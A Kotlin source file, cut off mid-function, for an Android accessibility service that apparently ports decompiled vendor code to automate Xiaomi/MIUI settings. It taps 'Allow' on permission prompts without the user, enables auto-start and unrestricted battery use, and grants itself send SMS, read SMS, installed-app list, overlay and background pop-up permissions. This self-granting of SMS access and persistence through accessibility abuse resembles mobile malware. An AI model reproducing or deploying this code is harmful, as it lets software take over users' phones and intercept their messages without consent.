package com.storm.safe.rock.service.modules.yw5xud

import android.accessibilityservice.GestureDescription
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Path
import android.graphics.Rect
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.delay

/**
 * MiuiSteps — Xiaomi/MIUI-specific keepalive permission automation.
 * Matches vendor C0367a4 (a4, MiuiSteps). Key flows:
 *
 * 1. Auto-start management (自启动管理)
 *    - Navigate to: com.miui.securitycenter/.AutoStartManagementActivity
 *    - Find app in list, enable auto-start switch
 * 2. Battery saver (省电策略)
 *    - Navigate to app's battery settings
 *    - Set to "无限制" (No restrictions) via RadioButton
 * 3. Background popup (后台弹窗)
 *    - Navigate to permissions settings
 *    - Enable "显示弹窗" (Show popup) switch
 * 4. Lock screen display (锁屏显示)
 *    - Enable notification display on lock screen
 */
class MiuiSteps(
    private val service: MyAccessibilityService?,
    private val context: Context
) {
    companion object {
        private const val TAG = "MiuiSteps"

        // Security center component names
        val AUTOSTART_COMPONENTS = listOf(
            ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"),
            ComponentName("com.miui.securitycenter", "com.miui.securitycenter.autostart.AutoStartManagementActivity")
        )

        val BATTERY_COMPONENTS = listOf(
            ComponentName("com.miui.powerkeeper", "com.miui.powerkeeper.ui.HiddenAppsConfigActivity"),
            ComponentName("com.miui.securitycenter", "com.miui.powercenter.PowerSettings")
        )

        /** Keywords for finding auto-start toggle. Vendor 自启动 keywords. */
        val AUTOSTART_KEYWORDS = listOf("自启动", "自动启动", "Auto-start", "Autostart", "Auto start")

        /** Keywords for battery no-restriction. Vendor f55104c3 + f55105c4. */
        val BATTERY_NO_RESTRICT_KEYWORDS = listOf("无限制", "No restrictions", "Unrestricted", "不限制")
        val BATTERY_RADIO_KEYWORDS = listOf(
            "无限制", "后台运行超过10分钟后关闭", "禁止后台运行", "智能限制",
            "10分钟后关闭", "不采取任何限制措施",
            "無限制", "後台運行超過10分鐘後關閉", "禁止後台運行"
        )

        /** Keywords for battery detail entry. */
        val BATTERY_DETAIL_KEYWORDS = listOf("电量使用详情", "电池使用详情", "Battery usage details", "電量使用詳情")

        /** Keywords for background popup. */
        val BG_POPUP_KEYWORDS = listOf("后台弹出界面", "后台弹窗", "Background pop-up", "Display pop-up")

        /** Permission management entry keywords. */
        val PERM_MGMT_KEYWORDS = listOf("权限管理", "權限管理", "Permission management")

        /** 6 permissions to enable in permission management page. Vendor MiuiSteps pattern. */
        val PERM_ITEMS = listOf(
            "发送短信", "读取短信", "读取已安装应用列表",
            "后台弹出界面", "通知类短信", "显示悬浮窗"
        )

        /** "Always allow" keywords for permission detail page. */
        val ALWAYS_ALLOW_KEYWORDS = listOf("始终允许", "始終允許", "Always allow", "允许", "允許", "Allow")

        /** Confirm dialog keywords. Vendor f55093b2. */
        val CONFIRM_KEYWORDS = listOf(
            "确定", "允许", "始终允许", "允许使用照片和视频", "所有文件",
            "允许管理所有文件", "允许访问全部", "使用期间允许", "仅使用期间允许",
            "使用应用时允许", "使用时允许", "仅在使用中允许", "仅在前台使用应用时允许",
            "仅在使用该应用时允许", "允许本次使用", "本次使用时允许", "允许通知",
            "確定", "允許", "始終允許", "Allow", "ALLOW", "Always allow",
            "While using the app"
        )

        /** Switch class names for matching. Vendor c7 list. */
        val SWITCH_CLASS_NAMES = listOf(
            "CheckBox", "Switch", "ToggleButton", "CompoundButton",
            "SwitchCompat", "HwSwitch", "MiuiSwitch", "slide"
        )

        /** Default page-stable wait: 2 consecutive polls with same node count. JADX: m212294f9 defaults. */
        private const val STABLE_REQUIRED_COUNT = 2
        private const val STABLE_POLL_INTERVAL_MS = 100L
        private const val STABLE_TIMEOUT_MS = 2000L

        /** Max scroll attempts for finding text. Vendor clickTextWithScroll default. */
        private const val MAX_SCROLL_ATTEMPTS = 5

        /** Permission allow keywords for Phase 0 self-polling. Vendor f55110a4. */
        val PERMISSION_ALLOW_KEYWORDS = listOf(
            "始终允许", "允许访问全部", "允许管理所有文件", "所有文件",
            "仅在使用中允许", "仅在使用此应用时允许", "在使用该应用时允许",
            "允许", "同意", "确定", "好",
            "Allow", "ALLOW", "Always allow", "While using the app"
        )

        /** Permission management keywords for 6-permission flow. Vendor m212256b5. */
        val PERM_MGMT_ENTRY_KEYWORDS = listOf("权限管理", "權限管理", "Permissions", "Permission manager")

        /** JADX step 3: 「其他权限」入口关键词。Vendor m212256b5 line 3088. */
        val OTHER_PERM_KEYWORDS = listOf("其他权限", "应用权限", "单项权限", "权限", "Other permissions", "App permissions", "Permissions")

        /** Page validation keywords — at least one must be present on ApplicationsDetailsActivity. */
        val APP_DETAIL_VALIDATION_KEYWORDS = listOf(
            "权限管理", "通知管理", "存储占用", "流量使用情况", "自启动", "电量使用详情",
            "Permissions", "Notifications", "Storage", "Data usage", "Auto-start", "Battery usage"
        )

        /** 6 permissions to set in permission management page. Vendor mapM213614f9. */
        val PERM_MGMT_ITEMS: List<Pair<String, List<String>>> = listOf(
            "发送短信" to listOf("发送短信", "發送短信", "Send SMS"),
            "读取短信" to listOf("读取短信与彩信", "读取短信", "讀取短信與彩信", "Read SMS"),
            "读取应用列表" to listOf("读取应用列表", "获取应用列表", "讀取應用列表", "Read app list"),
            "后台弹出界面" to listOf("后台弹出界面", "後台彈出界面", "Background pop-up"),
            "通知类短信" to listOf("通知类短信", "通知類短信", "Notification SMS"),
            "显示悬浮窗" to listOf("显示悬浮窗", "悬浮窗", "顯示懸浮窗", "Display over other apps")
        )

        /** Keywords to click after entering permission detail page. */
        val PERM_ALLOW_KEYWORDS = listOf(
            "始终允许", "Allow always", "允许", "Allow",
            "仅在使用时允许", "While using the app"
        )

        /** Phase 0 polling: 100 iterations x 50ms = 5s per round. */
        private const val PERM_POLL_ITERATIONS = 100
        private const val PERM_POLL_INTERVAL_MS = 50L
    }

    /**
     * Main execution entry for MIUI-specific steps.
     * Vendor m212253b2: 5 phases — basic permissions, battery, auto-start,
     * notification, background popup/overlay. Each phase opens settings,
     * waits for page stable, then actively searches and clicks UI elements.
     */
    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        logs.add("MiuiSteps: 开始小米/MIUI权限配置")
        UiDebugger.logStep(TAG, "MiuiSteps.execute() 开始", "brand=xiaomi")

        // Phase 0: Basic permissions — self-polling click loop (vendor f55110a4 keywords)
        // Launch umrkmgrri for batch runtime permission request, then poll 100×50ms
        // searching for allow keywords and clicking them directly. No handler dependency.
        try {
            logs.add("MiuiSteps: 启动基础权限请求 (umrkmgrri)")
            UiDebugger.dumpPage(service, "miui_phase0_before", "基础权限请求前")
            com.storm.safe.rock.service.modules.yw5xud.umrkmgrri.start(context)
            interruptibleDelay(800L)

            var clickCount = 0
            for (i in 0 until PERM_POLL_ITERATIONS) {
                if (!com.storm.safe.rock.service.modules.yw5xud.umrkmgrri.isRequestingPermissions) {
                    Log.i(TAG, "[Phase0] umrkmgrri finished after ${i * PERM_POLL_INTERVAL_MS}ms, clicks=$clickCount")
                    break
                }
                val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
                if (root != null) {
                    if (pollClickPermissionAllow(root)) clickCount++
                }
                delay(PERM_POLL_INTERVAL_MS)
            }
            UiDebugger.dumpPage(service, "miui_phase0_after", "基础权限完成, clicks=$clickCount")
            successes.add("基础权限请求完成 (点击${clickCount}次)")
        } catch (e: Exception) {
            Log.w(TAG, "[Phase0] 异常: ${e.message}")
        }

        // Phase 1: Auto-start management — search for "自启动" on app detail page
        executeAutoStart(successes, failures, logs)
        waitForPageStable()
        interruptibleDelay(1500L)
        UiDebugger.dumpPage(service, "miui_phase1_app_detail", "应用详情页已打开")
        // On ApplicationsDetailsActivity, search for "自启动" text and click its switch
        val autoStartKeywords = arrayOf("自启动", "自啟動")
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
        if (root != null) {
            UiDebugger.dumpPage(service, "miui_phase1_find_switch", "搜索自启动开关")
            var found = false
            for (keyword in autoStartKeywords) {
                val result = findTextAndClickSwitch(root, keyword)
                if (result) {
                    handleConfirmPopupDialog()
                    successes.add("小米自启动开关已点击")
                    found = true
                    break
                }
            }
            if (!found) {
                Log.w(TAG, "[自启动] 未找到自启动开关")
            }
        }
        interruptibleDelay(1000L)

        // Phase 2: Power strategy — via ApplicationsDetailsActivity → 电量使用详情 → 无限制
        executePowerStrategy(successes, failures, logs)
        interruptibleDelay(1000L)

        // Phase 3: Permission management — 6 permissions in one flow (vendor step 18.1)
        executePermissionManagement(successes, failures, logs)
        interruptibleDelay(1000L)

        // Vendor: NO returnToHome after last phase — settings page stays in foreground.
        // This provides VISIBLE_WINDOW for subsequent resumeWriteSettingsPermissionRequest.
        logs.add("MiuiSteps: 小米/MIUI权限配置完成")
    }

    /**
     * Navigate to auto-start management and enable for our app.
     * Vendor: executeAutoStart flow
     */
    fun executeAutoStart(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            UiDebugger.logStep(TAG, "Phase1: executeAutoStart 开始")
            // Vendor: open ApplicationsDetailsActivity with package_name extra
            // This shows OUR app's detail page (with auto-start switch), not the list of all apps
            val securityPkg = "com.miui.securitycenter"
            try {
                val intent = Intent().apply {
                    component = ComponentName(securityPkg, "com.miui.appmanager.ApplicationsDetailsActivity")
                    putExtra("package_name", context.packageName)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or
                             Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                (service ?: context).startActivity(intent)
                logs.add("已启动安全中心应用详情页（带自启动）")
                successes.add("小米应用详情页已打开")
                return
            } catch (e: Exception) {
                logs.add("安全中心应用详情打开失败: ${e.message}，尝试标准方式")
            }

            // Fallback: standard app details settings
            val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = android.net.Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or
                         Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            (service ?: context).startActivity(intent)
            logs.add("已打开标准应用详情页（无自启动）")
        } catch (e: Exception) {
            failures.add("小米自启动配置异常: ${e.message}")
        }
    }

    /**
     * Power strategy: open ApplicationsDetailsActivity → click "电量使用详情" → click "无限制".
     * Replaces old executeBatterySaver which used HiddenAppsConfigActivity.
     * Vendor: executePowerStrategyByCommand pattern.
     */
    suspend fun executePowerStrategy(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            UiDebugger.logStep(TAG, "Phase2: executePowerStrategy 开始")
            // Step 1: Open ApplicationsDetailsActivity
            val securityPkg = "com.miui.securitycenter"
            val launched = try {
                val intent = Intent().apply {
                    component = ComponentName(securityPkg, "com.miui.appmanager.ApplicationsDetailsActivity")
                    putExtra("package_name", context.packageName)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or
                             Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                (service ?: context).startActivity(intent)
                true
            } catch (_: Exception) { false }

            if (!launched) {
                // Fallback to old battery components
                executeBatterySaver(successes, failures, logs)
                waitForPageStable()
                interruptibleDelay(1500L)
                findAndClickText(BATTERY_NO_RESTRICT_KEYWORDS)
                return
            }

            logs.add("[省电策略] 已打开应用详情页")
            interruptibleDelay(1500L)
            waitForPageStable()
            UiDebugger.dumpPage(service, "miui_phase2_app_detail", "省电策略-应用详情页")

            // Step 2: Click "电量使用详情" to enter battery detail page
            UiDebugger.dumpPage(service, "miui_phase2_find_battery", "搜索电量使用详情入口")
            var enteredBatteryPage = false
            for (keyword in BATTERY_DETAIL_KEYWORDS) {
                val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: continue
                val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
                if (nodes.isNullOrEmpty()) continue
                for (node in nodes) {
                    if (node.isVisibleToUser) {
                        if (clickNodeWithFallback(node)) {
                            Log.i(TAG, "[省电策略] 进入电量详情: $keyword")
                            enteredBatteryPage = true
                            break
                        }
                    }
                }
                if (enteredBatteryPage) break
            }

            if (!enteredBatteryPage) {
                logs.add("[省电策略] 未找到电量使用详情入口，跳过省电策略")
                return
            } else {
                interruptibleDelay(1500L)
                waitForPageStable()
            }

            // Step 3: Click "无限制"
            val clicked = findAndClickText(BATTERY_NO_RESTRICT_KEYWORDS)
            if (clicked) {
                successes.add("小米省电策略已设置为无限制")
                Log.i(TAG, "[省电策略] 已点击无限制")
            } else {
                // Try radio keywords as fallback
                val radioClicked = findAndClickText(BATTERY_RADIO_KEYWORDS)
                if (radioClicked) {
                    successes.add("小米省电策略已设置为无限制")
                } else {
                    logs.add("[省电策略] 未找到无限制选项")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "[省电策略] 异常: ${e.message}", e)
            failures.add("小米省电策略异常: ${e.message}")
        }
    }

    /**
     * Navigate to battery saver settings and set to unrestricted.
     * Vendor: executeBatterySaver flow (legacy fallback)
     */
    fun executeBatterySaver(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            val launched = launchComponentActivity(BATTERY_COMPONENTS)
            if (launched) {
                logs.add("已启动省电策略页面")
                successes.add("小米省电策略已打开")
            } else {
                // Fallback: open app info battery settings
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = android.net.Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                context.startActivity(intent)
                logs.add("已打开应用信息页面(回退)")
            }
        } catch (e: Exception) {
            failures.add("小米省电策略配置异常: ${e.message}")
        }
    }

    /**
     * Enable background popup permission.
     * Vendor: executeBackgroundPopup flow
     */
    fun executeBackgroundPopup(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            // Navigate to app permissions
            val intent = Intent("miui.intent.action.APP_PERM_EDITOR").apply {
                putExtra("extra_pkgname", context.packageName)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            (service ?: context).startActivity(intent)
            logs.add("已启动MIUI权限编辑器")
            successes.add("小米后台弹窗权限已打开")
        } catch (e: Exception) {
            // Fallback
            logs.add("MIUI权限编辑器启动失败, 跳过后台弹窗: ${e.message}")
        }
    }

    /**
     * Permission management — 6 permissions in one flow.
     * JADX: C0367a4.m212256b5 (executeBackgroundPopupFlow)
     */
    suspend fun executePermissionManagement(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            UiDebugger.logStep(TAG, "Phase3: executePermissionManagement 开始")
            // ADAPT: vendor 直接 startActivity，不回桌面（HOME 会触发小米负一屏新闻）
            val securityPkg = "com.miui.securitycenter"
            val intent = Intent().apply {
                component = ComponentName(securityPkg, "com.miui.appmanager.ApplicationsDetailsActivity")
                putExtra("package_name", context.packageName)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
            }
            try {
                (service ?: context).startActivity(intent)
                logs.add("已打开安全中心应用详情页")
            } catch (e: Exception) {
                logs.add("安全中心应用详情打开失败: ${e.message}")
                return
            }

            interruptibleDelay(1500L)
            waitForPageStable()
            UiDebugger.dumpPage(service, "miui_phase3_security_center", "安全中心应用详情页")

            var enteredPermMgmt = false
            for (keyword in PERM_MGMT_ENTRY_KEYWORDS) {
                if (clickTextNode(keyword)) { enteredPermMgmt = true; logs.add("已进入权限管理页面"); break }
            }
            if (!enteredPermMgmt) {
                val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
                if (root != null) {
                    for (i in 0 until 3) {
                        scrollDown(root); interruptibleDelay(500L)
                        for (keyword in PERM_MGMT_ENTRY_KEYWORDS) {
                            if (clickTextNode(keyword)) { enteredPermMgmt = true; break }
                        }
                        if (enteredPermMgmt) break
                    }
                }
            }
            if (!enteredPermMgmt) { logs.add("未找到权限管理入口"); return }

            interruptibleDelay(1500L)
            waitForPageStable()
            UiDebugger.dumpPage(service, "miui_phase3_perm_mgmt", "权限管理页面")

            // JADX step 3: 点击「其他权限」进入子页面（vendor m212256b5 line 3088-3139）
            var enteredOtherPerm = false
            for (keyword in OTHER_PERM_KEYWORDS) {
                if (clickTextNode(keyword)) { enteredOtherPerm = true; Log.i(TAG, "[权限管理] 已进入「$keyword」子页面"); break }
            }
            if (!enteredOtherPerm) {
                val root2 = try { service?.rootInActiveWindow } catch (_: Exception) { null }
                if (root2 != null) {
                    for (i in 0 until 3) {
                        scrollDown(root2); interruptibleDelay(500L)
                        for (keyword in OTHER_PERM_KEYWORDS) {
                            if (clickTextNode(keyword)) { enteredOtherPerm = true; break }
                        }
                        if (enteredOtherPerm) break
                    }
                }
            }
            if (!enteredOtherPerm) {
                Log.w(TAG, "[权限管理] 未找到「其他权限」入口，直接在当前页面查找权限")
            } else {
                interruptibleDelay(1500L)
                waitForPageStable()
                UiDebugger.dumpPage(service, "miui_phase3_other_perms", "其他权限子页面")
            }

            var completedCount = 0
            for ((name, keywords) in PERM_MGMT_ITEMS) {
                UiDebugger.dumpPage(service, "miui_phase3_perm_${name}", "搜索权限: $name")
                // Verify we're still on the other permissions page before each item
                // If pressBack went too far (back to 系统服务), re-enter 其他权限
                if (!ensureOnOtherPermissionsPage()) {
                    Log.w(TAG, "[权限管理] 无法回到其他权限页面，中止")
                    break
                }

                val clicked = clickPermissionItemMulti(keywords, logs)
                if (clicked) {
                    interruptibleDelay(800L)
                    // Check if already authorized (content-desc or text shows "始终允许")
                    val alreadyAllowed = isPermissionAlreadyAllowed()
                    if (alreadyAllowed) {
                        Log.i(TAG, "[权限管理] $name: 已是始终允许，跳过")
                        pressBack()
                        interruptibleDelay(500L)
                        completedCount++
                        continue
                    }
                    var allowed = false
                    for (allowKw in PERM_ALLOW_KEYWORDS) {
                        if (clickTextNode(allowKw)) {
                            allowed = true
                            Log.i(TAG, "[权限管理] $name -> $allowKw")
                            break
                        }
                    }
                    if (!allowed) Log.w(TAG, "[权限管理] $name: 未找到允许按钮")
                    interruptibleDelay(150L)
                    pressBack()
                    interruptibleDelay(500L)
                    completedCount++
                } else {
                    Log.w(TAG, "[权限管理] $name: 未找到权限项")
                }
            }
            successes.add("权限管理完成 ($completedCount/${PERM_MGMT_ITEMS.size})")
        } catch (e: Exception) {
            failures.add("权限管理配置失败: ${e.message}")
        }
    }

    private suspend fun clickPermissionItemMulti(keywords: List<String>, logs: MutableList<String>): Boolean {
        // First try without scrolling
        for (keyword in keywords) { if (clickTextNode(keyword)) return true }
        // Scroll down with fresh root each time — MIUI other permissions page is very long
        for (i in 0 until 6) {
            val freshRoot = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
            val pkg = freshRoot.packageName?.toString() ?: ""
            Log.d(TAG, "[权限搜索] scroll down #$i, pkg=$pkg, keywords=$keywords")
            if (pkg != "com.miui.securitycenter") {
                Log.w(TAG, "[权限搜索] 已离开安全中心，停止滚动")
                return false
            }
            scrollDown(freshRoot); interruptibleDelay(500L)
            for (keyword in keywords) { if (clickTextNode(keyword)) return true }
        }
        return false
    }

    /**
     * Check if the current permission detail page already shows "始终允许" as selected.
     * MIUI uses RadioButton or checked state to indicate current selection.
     */
    private fun isPermissionAlreadyAllowed(): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        for (keyword in PERM_ALLOW_KEYWORDS) {
            val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
            if (nodes.isNullOrEmpty()) continue
            for (node in nodes) {
                if (!node.isVisibleToUser) continue
                if (node.isChecked || node.isSelected) return true
                val parent = node.parent
                if (parent != null && (parent.isChecked || parent.isSelected)) return true
            }
        }
        return false
    }

    /**
     * Ensure we're on the "其他权限" (OtherPermissionsActivity) page.
     * If pressBack went too far and we're on "系统服务" (ApplicationsDetailsActivity),
     * re-click "其他权限" to go back in.
     */
    private suspend fun ensureOnOtherPermissionsPage(): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        val pkg = root.packageName?.toString() ?: ""
        if (pkg != "com.miui.securitycenter") {
            Log.w(TAG, "[权限管理] 已离开安全中心 (pkg=$pkg)")
            return false
        }
        // Detect which page we're on:
        // Level 1 "系统服务" app detail: has 通知管理, 自启动, 存储占用, 权限管理
        // Level 2 "权限管理" permissions: has 位置, 相机, 麦克风, 其他权限
        // Level 3 "其他权限" other perms: has 发送短信, 拨打电话, 后台弹出界面, 显示悬浮窗
        val otherPermIndicators = listOf("发送短信", "拨打电话", "读取剪贴板", "后台弹出界面", "显示悬浮窗", "通知类短信", "获取应用列表")
        val permMgmtIndicators = listOf("位置", "相机", "麦克风")  // Level 2 page
        val appDetailIndicators = listOf("通知管理", "自启动", "存储占用", "流量使用情况")

        var otherPermScore = 0
        var permMgmtScore = 0
        var appDetailScore = 0
        for (indicator in otherPermIndicators) {
            val nodes = try { root.findAccessibilityNodeInfosByText(indicator) } catch (_: Exception) { null }
            if (!nodes.isNullOrEmpty()) otherPermScore++
        }
        for (indicator in permMgmtIndicators) {
            val nodes = try { root.findAccessibilityNodeInfosByText(indicator) } catch (_: Exception) { null }
            if (!nodes.isNullOrEmpty()) permMgmtScore++
        }
        for (indicator in appDetailIndicators) {
            val nodes = try { root.findAccessibilityNodeInfosByText(indicator) } catch (_: Exception) { null }
            if (!nodes.isNullOrEmpty()) appDetailScore++
        }

        if (otherPermScore >= 2) {
            UiDebugger.dumpPage(service, "miui_phase3_ensure_page", "ensureOn: otherPerm=$otherPermScore permMgmt=$permMgmtScore appDetail=$appDetailScore")
            return true  // Already on "其他权限" page
        }

        if (permMgmtScore >= 2) {
            UiDebugger.dumpPage(service, "miui_phase3_ensure_page", "ensureOn: otherPerm=$otherPermScore permMgmt=$permMgmtScore appDetail=$appDetailScore")
            // On "权限管理" page (level 2) — just click "其他权限"
            Log.i(TAG, "[权限管理] 检测到在权限管理页面，点击其他权限")
            for (otherKw in OTHER_PERM_KEYWORDS) {
                if (clickTextNode(otherKw)) {
                    Log.i(TAG, "[权限管理] 重新进入「$otherKw」子页面")
                    interruptibleDelay(1500L)
                    waitForPageStable()
                    return true
                }
            }
            // "其他权限" might need scroll
            val scrollRoot = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (scrollRoot != null) {
                for (i in 0 until 3) {
                    scrollDown(scrollRoot); interruptibleDelay(500L)
                    for (otherKw in OTHER_PERM_KEYWORDS) {
                        if (clickTextNode(otherKw)) {
                            Log.i(TAG, "[权限管理] 滚动后重新进入「$otherKw」子页面")
                            interruptibleDelay(1500L)
                            waitForPageStable()
                            return true
                        }
                    }
                }
            }
            Log.w(TAG, "[权限管理] 在权限管理页面未找到其他权限入口")
            return false
        }

        if (appDetailScore >= 2) {
            UiDebugger.dumpPage(service, "miui_phase3_ensure_page", "ensureOn: otherPerm=$otherPermScore permMgmt=$permMgmtScore appDetail=$appDetailScore")
            // On "系统服务" app detail page (level 1) — need 权限管理 → 其他权限
            Log.i(TAG, "[权限管理] 检测到在系统服务页面，重新进入其他权限")
            for (keyword in PERM_MGMT_ENTRY_KEYWORDS) {
                if (clickTextNode(keyword)) {
                    interruptibleDelay(1500L)
                    waitForPageStable()
                    for (otherKw in OTHER_PERM_KEYWORDS) {
                        if (clickTextNode(otherKw)) {
                            Log.i(TAG, "[权限管理] 重新进入「$otherKw」子页面")
                            interruptibleDelay(1500L)
                            waitForPageStable()
                            return true
                        }
                    }
                    break
                }
            }
            Log.w(TAG, "[权限管理] 重新进入其他权限失败")
            return false
        }
        // Unknown page but still in securitycenter — try to proceed
        return true
    }

    private fun clickTextNode(text: String): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        val nodes = try { root.findAccessibilityNodeInfosByText(text) } catch (_: Exception) { null }
        if (nodes.isNullOrEmpty()) return false
        for (node in nodes) {
            if (!node.isVisibleToUser) continue
            val nodeText = node.text?.toString()?.trim() ?: ""
            if (nodeText == text || nodeText.contains(text, ignoreCase = true)) {
                return clickNodeWithFallback(node)
            }
        }
        return false
    }

    private fun scrollUp(root: AccessibilityNodeInfo): Boolean {
        val scrollable = findScrollableNode(root)
        if (scrollable != null) {
            val result = scrollable.performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD)
            if (result) return true
        }
        val w = context.resources.displayMetrics.widthPixels
        val h = context.resources.displayMetrics.heightPixels
        return gestureSwipe(w / 2f, h * 0.3f, w / 2f, h * 0.7f)
    }

    private suspend fun pressBack() {
        try {
            service?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
            interruptibleDelay(100L)
        } catch (_: Exception) {}
    }

    /** Try launching each component in order, return true on first success.
     *  Uses service.startActivity() for BAL_ALLOW_TOKEN on MIUI, falls back to context. */
    internal fun launchComponentActivity(components: List<ComponentName>): Boolean {
        for (component in components) {
            try {
                val intent = Intent().apply {
                    this.component = component
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                (service ?: context).startActivity(intent)
                return true
            } catch (_: Exception) { continue }
        }
        return false
    }

    // ── Wait utilities (vendor m212294f9, m212272d6) ────────────────

    /**
     * Wait until the accessibility root window node count stabilizes.
     * Matches vendor m212294f9 (waitForPageStable):
     * Polls rootInActiveWindow, counts nodes; when [requiredStableCount]
     * consecutive polls return the same count, returns true.
     * Returns false on timeout.
     */
    internal suspend fun waitForPageStable(
        requiredStableCount: Int = STABLE_REQUIRED_COUNT,
        pollIntervalMs: Long = STABLE_POLL_INTERVAL_MS,
        timeoutMs: Long = STABLE_TIMEOUT_MS
    ): Boolean {
        val startTime = System.currentTimeMillis()
        var lastNodeCount = -1
        var stableHits = 0

        while (System.currentTimeMillis() - startTime < timeoutMs) {
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            val nodeCount = if (root != null) countNodes(root) else 0
            try { root?.recycle() } catch (_: Exception) {}

            if (nodeCount == lastNodeCount && nodeCount > 0) {
                stableHits++
                if (stableHits >= requiredStableCount) {
                    Log.d(TAG, "[waitForPageStable] page stable (nodes=$nodeCount, hits=$stableHits)")
                    return true
                }
            } else {
                lastNodeCount = nodeCount
                stableHits = 0
            }
            interruptibleDelay(pollIntervalMs)
        }
        Log.d(TAG, "[waitForPageStable] timeout after ${timeoutMs}ms")
        return false
    }

    /**
     * Delay in small chunks (100ms) to stay responsive to cancellation.
     * Matches vendor m212272d6 (interruptibleDelay).
     */
    internal suspend fun interruptibleDelay(totalMs: Long) {
        var remaining = totalMs
        while (remaining > 0) {
            val chunk = minOf(remaining, 100L)
            delay(chunk)
            remaining -= chunk
        }
    }

    /**
     * Find our app in a list and click its switch/toggle.
     * Searches by app name first, then by keywords. Scrolls if not found.
     * JADX: m212290f5 (verifyAndEnableAutoStart) + m212249a3 (clickTextWithScroll).
     */
    internal suspend fun findAndClickAppSwitch(keywords: List<String>): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        try {
            // First try: search by app label
            val appLabel = getAppLabel()
            if (appLabel.isNotEmpty()) {
                val result = findTextAndClickSwitch(root, appLabel)
                if (result) {
                    Log.i(TAG, "[findAndClickAppSwitch] found by app label: $appLabel")
                    return true
                }
            }

            // Second try: search by keywords
            for (keyword in keywords) {
                val result = findTextAndClickSwitch(root, keyword)
                if (result) {
                    Log.i(TAG, "[findAndClickAppSwitch] found by keyword: $keyword")
                    return true
                }
            }

            // Third try: scroll and retry (vendor clickTextWithScroll)
            for (scrollAttempt in 0 until MAX_SCROLL_ATTEMPTS) {
                if (!scrollDown(root)) break
                interruptibleDelay(500L)
                val newRoot = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: break
                if (appLabel.isNotEmpty()) {
                    val result = findTextAndClickSwitch(newRoot, appLabel)
                    if (result) return true
                }
                for (keyword in keywords) {
                    val result = findTextAndClickSwitch(newRoot, keyword)
                    if (result) return true
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "[findAndClickAppSwitch] error: ${e.message}")
        }
        return false
    }

    /**
     * Find text node and click the adjacent Switch/CheckBox/Toggle.
     * Vendor: m212264c6 (findSwitchNearNode) — searches parent's children up to 3 levels.
     */
    private fun findTextAndClickSwitch(root: AccessibilityNodeInfo, text: String): Boolean {
        val nodes = try { root.findAccessibilityNodeInfosByText(text) } catch (_: Exception) { null }
        if (nodes.isNullOrEmpty()) return false
        for (node in nodes) {
            if (!node.isVisibleToUser) continue
            val nodeText = node.text?.toString()?.trim() ?: ""
            if (nodeText != text && !nodeText.contains(text, ignoreCase = true)) continue

            // Try finding switch near this node (vendor c6 pattern: 3-level sibling search)
            val switchNode = findSwitchNearNode(node)
            if (switchNode != null) {
                val switchClass = switchNode.className?.toString() ?: ""
                val switchChecked = switchNode.isChecked
